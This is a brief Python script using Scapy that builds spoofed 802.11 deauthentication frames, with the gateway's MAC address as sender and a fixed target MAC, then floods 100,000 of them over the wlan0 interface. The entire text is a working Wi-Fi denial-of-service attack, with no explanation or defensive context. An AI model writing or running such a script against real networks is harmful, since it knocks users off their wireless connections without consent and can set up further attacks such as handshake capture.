traget_mac="40:1A:58:09:73:36"
gateway_mac="44:95:3B:A0:1D:70"
#802.11 frame
from scapy.all import *
dot11 =Dot11(addr1=traget_mac, addr2=gateway_mac,addr3=gateway_mac)
#Network Packets
packet=RadioTap()/dot11/Dot11Deauth(reason=7)
#Send the packet
sendp(packet, inter=0.001, count=100000,iface="wlan0",verbose=1 )